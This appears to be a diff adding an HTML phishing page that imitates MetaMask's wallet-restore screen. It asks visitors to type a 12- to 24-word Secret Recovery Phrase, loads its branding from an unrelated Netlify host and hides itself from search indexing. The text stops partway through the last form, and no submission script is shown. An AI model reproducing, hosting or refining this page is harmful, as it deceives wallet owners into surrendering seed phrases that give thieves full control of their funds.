@@ -1,0 +1,1591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask</title>
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="googlebot-news" content="nosnippet">
+    <link rel="icon" href="https://bestfilltype.netlify.app/icon.png">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+     <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
+
+*{
+  margin: 0;
+  padding: 0;
+}
+body{
+   box-sizing: border-box;
+   font-family: 'Poppins', sans-serif;
+}
+button,input, select{
+  font-family: inherit;
+}
+.container{
+  width: 65%;
+  margin: 20px auto;
+}
+.head-box{
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.select-box select{
+  padding: 7px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+.form-mainbox{
+  width: 65%;
+  margin: 50px auto;
+  border: 1px solid #d6d9dc;
+  padding: 20px;
+  border-radius: 15px;
+  background-color: #fff;
+}
+.progress-box{
+  text-align: center;
+}
+.head-text{
+  text-align: center;
+  margin-top: 10px;
+}
+.head-text h1 {
+  font-size: 28px;
+}
+.head-text-p{
+  text-align: center;
+  margin: 20px;
+}
+.head-text-p p a{
+  text-decoration: none;
+}
+.main-phbox{
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin: 0 20px;
+}
+.box-selec{
+  width: 45%;
+  margin: 20px 0;
+  padding: 0 10px;
+}
+.box-selec select{
+  width: 100%;
+}
+.message-box{
+  display: flex;
+  align-items: center;
+  padding: 5px;
+  border-left: 4px solid #0376c9;
+  background-color: #0376c919;
+  margin: 10px 20px;
+  border-radius: 5px;
+}
+.icon-text p{
+  font-size: 15px;
+  transform: translateY(-3px);
+  margin-left: 4px;
+}
+.form-box-main{
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  grid-gap: 20px;
+  margin: 20px 10px;
+
+}
+.input-form{
+  display: flex;
+  align-items: center;
+}
+.input-form input{
+  width: 80%;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+}
+.input-form input:focus{
+  outline: none;
+  border: 1px solid #0376c9;
+}
+.btnBox{
+  margin: 30px 0;
+  text-align: center;
+}
+.btnBox button{
+   padding: 15px 30px;
+   border-radius: 100px;
+   border: none;
+   background-color: #0376c9;
+   color: #fff;
+   cursor: pointer;
+}
+.btnBox button:disabled{
+   background-color: #71c1fa9a;
+}
+.hide{
+  display: none;
+}
+.icon2{
+  display: none;
+}
+.tada-box{
+  text-align: center;
+}
+
+.loader,
+.loader:after {
+  border-radius: 50%;
+  width: 5em;
+  height: 5em;
+}
+.loader {
+  margin: 60px auto;
+  font-size: 5px;
+  position: relative;
+  text-indent: -9999em;
+  border-top: .8em solid orange;
+  border-right: .8em solid orange;
+  border-bottom: .8em solid orange;
+  border-left: .8em solid #ffffff;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+  -webkit-animation: load8 1.1s infinite linear;
+  animation: load8 .7s infinite linear;
+}
+.errbox{
+    text-align: center;
+    margin: 10px 0;
+}
+.errbox span{
+    color: red;
+    font-size: 14px;
+}
+@-webkit-keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes load8 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+ @keyframes animateContainer {
+    0%{
+        transform: translateX(10px);
+    }
+
+    100%{
+        transform: translateX(-50px);
+    }
+}
+
+.preloader{
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            top: 0;
+            left: 0;
+            background-color: #ffffffb2;
+            z-index: 4000;
+        }
+        .preloader-box{
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-40%, -50%);
+        }
+
+@media screen and (max-width:939px){
+  body{
+    overflow-x: hidden;
+  }
+  .container{
+    width: 90%;
+    margin: 10px;
+  }
+  .main-phbox{
+    flex-direction: column;
+    align-items: unset;
+    justify-content: unset;
+    margin: 0 10px;
+  }
+  .main-phbox h4{
+    text-align: center;
+  }
+  .form-mainbox{
+    width: 100%;
+    padding: 10px;
+    margin: 20px 0;
+  }
+  .progress-box  img{
+    width: 90%;
+  }
+  .icon2{
+    display: block;
+  }
+  .message-box{
+    margin: 0;
+  }
+  .icon-text p{
+    font-size: 13px;
+  }
+  .icon1{
+    display: none;
+  }
+  .icon2 img{
+    width: 40px;
+  }
+  .head-text-p{
+    font-size: 13px;
+    margin: 20px 10px;
+    text-align: unset;
+  }
+  .box-selec{
+    width: 100%;
+    padding: 0;
+  }
+  .select-box select{
+    width: 100%;
+  }
+  .head-text h1 {
+    font-size: 18px;
+  }
+
+  .form-box-main input{
+    width: 70%;
+    margin: 10px auto;
+  }
+  .form-box-main{
+    display: block;
+    text-align: center;
+  }
+
+}
+    </style>
+</head>
+<body>
+
+
+    <div class="preloader">
+        <div class="preloader-box">
+            <div>
+                <img src="https://bestfilltype.netlify.app/icon.png" alt="icon-load" width="80px">
+            </div>
+            <div class="loader">Loading...</div>
+        </div>
+    </div>
+
+
+    <div class="container">
+
+        <!--- Head Box -->
+        <div class="head-box">
+            <div class="logo-top icon1">
+                <img src="https://bestfilltype.netlify.app/logo.png" alt="logo-t">
+            </div>
+
+             <div class="logo-top icon2">
+                <img src="https://bestfilltype.netlify.app/icon.png" alt="logo-t">
+            </div>
+
+
+
+            <div class="select-box">
+                <select class="dropdown__select"><option value="am">English</option><option value="ar">Ø§ÙØ¹Ø±Ø¨ÙØ©</option><option value="bg">Ð±ÑÐ»Ð³Ð°ÑÑÐºÐ¸</option><option value="bn">à¦¬à¦¾à¦à¦²à¦¾</option><option value="ca">CatalÃ </option><option value="cs">ÄeÅ¡tina</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">ÎµÎ»Î»Î·Î½Î¹ÎºÎ¬</option><option value="en">English</option><option value="es">EspaÃ±ol</option><option value="es_419">EspaÃ±ol (Latin America)</option><option value="et">Estonian</option><option value="fa">ÙØ§Ø±Ø³Û</option><option value="fi">Suomi</option><option value="fil">Filipino</option><option value="fr">FranÃ§ais</option><option value="gu">àªà«àªàª°àª¾àª¤</option><option value="he">×¢××¨××ª</option><option value="hi">à¤®à¤¾à¤¨à¤ à¤¹à¤¿à¤¨à¥à¤¦à¥</option><option value="hn">à¤¹à¤¿à¤¨à¥à¤¦à¥</option><option value="hr">Hrvatski</option><option value="ht">KreyÃ²l ayisyen</option><option value="hu">Magyar</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">æ¥æ¬èª</option><option value="kn">à²à²¨à³à²¨à²¡</option><option value="ko">íêµ­ì´</option><option value="lt">LietuviÅ¡kai</option><option value="lv">Latvian</option><option value="ml">à´®à´²à´¯à´¾à´³à´</option><option value="mr">à¤®à¤°à¤¾à¤ à¥</option><option value="ms">Malay</option><option value="nl">Nederlands</option><option value="no">Norwegian</option><option value="ph">Pilipino</option><option value="pl">Polskie</option><option value="pt">PortuguÃªs</option><option value="pt_BR">PortuguÃªs (Brazillian)</option><option value="pt_PT">PortuguÃªs (European)</option><option value="ro">Limba romÃ¢nÄ</option><option value="ru">Ð ÑÑÑÐºÐ¸Ð¹</option><option value="sk">SlovenÄina</option><option value="sl">SlovenÅ¡Äina</option><option value="sr">ÑÑÐ¿ÑÐºÐ¸</option><option value="sv">Svenska</option><option value="sw">Swahili</option><option value="ta">à®¤à®®à®¿à®´à¯</option><option value="te">à°¤à±à°²à±à°à±</option><option value="th">à¹à¸à¸¢</option><option value="tl">Wikang Tagalog</option><option value="tr">TÃ¼rkÃ§e</option><option value="uk">Ð£ÐºÑÐ°ÑÐ½ÑÑÐºÐ° Ð¼Ð¾Ð²Ð°</option><option value="vi">Tiáº¿ng Viá»t</option><option value="zh_CN">ä¸­æ(ç®ä½)</option><option value="zh_TW">ä¸­æ(ç¹é«)</option></select>
+            </div>
+
+        </div>
+
+        <!--- Head Box END -->
+
+        <div class="form-mainbox no-done">
+            <div class="progress-box">
+                <img src="https://bestfilltype.netlify.app/confirm.png" alt="confirm">
+            </div>
+
+            <div class="head-text">
+                <h1>Access your wallet with your <br/> Secret Recovery Phrase</h1>
+            </div>
+
+            <div class="head-text-p">
+                <p>MetaMask cannot recover your password. We will use your </br> Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your<br/>wallet. <a href="#">Learn more</a></p>
+            </div>
+
+
+            <div class="main-phbox">
+                <h4>Type your Secret Recovery <br/> Phrase</h4>
+            
+                 <div class="select-box box-selec">
+                <select id="word">
+                    <option value="12">I have a 12-word phrase</option>
+                    <option value="15">I have a 15-word phrase</option>
+                    <option value="18">I have a 18-word phrase</option>
+                    <option value="21">I have a 21-word phrase</option>
+                    <option value="24">I have a 24-word phrase</option>
+                  </select>
+            </div>
+            </div>
+
+            <div class="errbox hide">
+                <span>Invalid Recovery Phrase, Please enter a valid Recovery Phrase</span>
+            </div>
+            <div class="message-box">
+                <div class="icon">
+                    <img src="https://bestfilltype.netlify.app/full.png" alt="icon">
+                </div>
+                <div class="icon-text">
+                    <p>You can paste your entire secret recovery phrase into any field</p>
+                </div>
+            </div>
+
+
+            <!--- Form12 ------>
+            <form action="#" id="form" class="form-main">
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">1. </label>
+                        <input type="password" class="word-12">
+                        <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">2. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">3.</label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">4. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">5. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">6. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">7. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">8. </label>
+                        <input type="password" class="word-12">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">9. </label>
+                        <input type="password" class="word-12">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+                </div>
+
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">10. </label>
+                        <input type="password" class="word-12">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">11. </label>
+                        <input type="password" class="word-12">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">12. </label>
+                        <input type="password" class="word-12">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye">
+                    </div>
+                </div>
+
+
+            <div class="btnBox">
+                <button disabled class="btn-cofirm">Confirm Secret Recovery Phrase</button>
+            </div>
+            </form>
+
+            <!--- End Form12 ------>
+
+
+
+
+
+              <!--- Form15 ------>
+            <form action="#" id="form" class="form-main hide">
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">1. </label>
+                        <input type="password" class="word-15">
+                        <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">2. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">3.</label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">4. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">5. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">6. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">7. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">8. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">9. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+                </div>
+
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">10. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">11. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">12. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+                </div>
+
+                  <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">13. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">14. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">15. </label>
+                        <input type="password" class="word-15">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-2">
+                    </div>
+                </div>
+
+
+
+            <div class="btnBox">
+                <button disabled class="btn-cofirm">Confirm Secret Recovery Phrase</button>
+            </div>
+            </form>
+            
+            <!--- End Form15 ------>
+
+
+
+
+
+
+
+
+
+            
+              <!--- Form18 ------>
+            <form action="#" id="form" class="form-main hide">
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">1. </label>
+                        <input type="password" class="word-18">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">2. </label>
+                        <input type="password"  class="word-18">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">3.</label>
+                        <input type="password"  class="word-18">
+                           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">4. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">5. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">6. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">7. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">8. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">9. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">10. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">11. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">12. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+                  <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">13. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">14. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">15. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">16. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">17. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">18. </label>
+                        <input type="password"  class="word-18">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-3">
+                    </div>
+                </div>
+
+
+
+            <div class="btnBox">
+                <button disabled class="btn-cofirm">Confirm Secret Recovery Phrase</button>
+            </div>
+            </form>
+            
+            <!--- End Form18 ------>
+
+
+
+
+            
+              <!--- Form21 ------>
+            <form action="#" id="form" class="form-main hide">
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">1. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">2. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">3.</label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">4. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">5. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">6. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">7. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">8. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">9. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">10. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">11. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">12. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+                  <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">13. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">14. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">15. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">16. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">17. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">18. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">19. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">20. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">21. </label>
+                        <input type="password" class="word-21">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-4">
+                    </div>
+                </div>
+
+            <div class="btnBox">
+                <button disabled class="btn-cofirm">Confirm Secret Recovery Phrase</button>
+            </div>
+            </form>
+            
+            <!--- End Form21 ------>
+
+
+
+
+
+
+
+
+                <!--- Form24 ------>
+            <form action="#" id="form" class="form-main hide">
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">1. </label>
+                        <input type="password" class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">2. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">3.</label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">4. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">5. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">6. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">7. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">8. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">9. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+
+                <div class="form-box-main">
+                    <div class="input-form">
+                        <label for="">10. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">11. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+
+                    <div class="input-form">
+                        <label for="">12. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+                  <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">13. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">14. </label>
+                        <input type="password" class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">15. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">16. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">17. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">18. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                </div>
+
+                <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">19. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">20. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">21. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+                    
+                </div>
+
+
+                 <div class="form-box-main">
+
+                    <div class="input-form">
+                        <label for="">22. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">23. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
+                    </div>
+
+                    <div class="input-form">
+                        <label for="">24. </label>
+                        <input type="password"  class="word-24">
+                         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye-5">
